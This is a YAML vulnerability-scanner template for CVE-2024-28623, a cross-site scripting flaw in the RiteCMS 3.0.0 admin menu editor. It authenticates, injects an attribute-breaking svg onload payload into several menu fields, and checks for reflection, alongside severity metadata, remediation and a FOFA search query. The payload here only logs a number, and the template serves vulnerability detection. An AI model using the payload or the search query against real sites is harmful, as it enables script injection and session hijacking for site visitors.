flow: http(1) && http(2)
http:
- matchers:
  - dsl:
    - status_code == 302
    internal: true
    type: dsl
  raw:
  - 'POST /admin.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username={{username}}&userpw={{password}}

    '
- matchers:
  - condition: and
    dsl:
    - contains_all(body, "{{string}}", "RiteCMS")
    - contains(content_type, "text/html")
    - status_code == 200
    type: dsl
  raw:
  - 'POST /admin.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    mode=menus&menu=main_menu&edit_item=4&name=faq&title=faq&link=faq&section=''"><svg/onload=console.log(''{{string}}'')>&accesskey=''"><svg/onload=console.log(''{{string}}'')>&submenu=''"><svg/onload=console.log(''{{string}}'')>&edit_menu_item_submitted=%C2%A0OK%C2%A0

    '
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-28623
info:
  author: 0x_Akoko
  classification:
    cpe: cpe:2.3:a:ritecms:ritecms:3.0:*:*:*:*:*:*:*
    cve-id: CVE-2024-28623
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.75576
    epss-score: 0.00935
  description: 'RiteCMS v3.0.0 contains a reflected XSS caused by unsanitized input
    in the main_menu/edit_section component, letting attackers execute arbitrary scripts
    in the context of the victim''s browser.

    '
  impact: 'Attackers can execute arbitrary scripts in the victim''s browser, potentially
    leading to session hijacking or defacement.

    '
  metadata:
    fofa-query: title="RiteCMS"
    max-request: 3
    product: ritecms
    vendor: ritecms
    verified: true
  name: RiteCMS 3.0.0 - Cross-site Scripting
  reference:
  - https://github.com/GURJOTEXPERT/ritecms
  - https://nvd.nist.gov/vuln/detail/CVE-2024-28623
  remediation: 'Sanitize and validate input in the main_menu/edit_section component,
    and update to the latest version if available.

    '
  severity: medium
  tags: cve,cve2024,ritecms,xss,oss,authenticated
variables:
  string: '{{rand_text_numeric(13)}}'
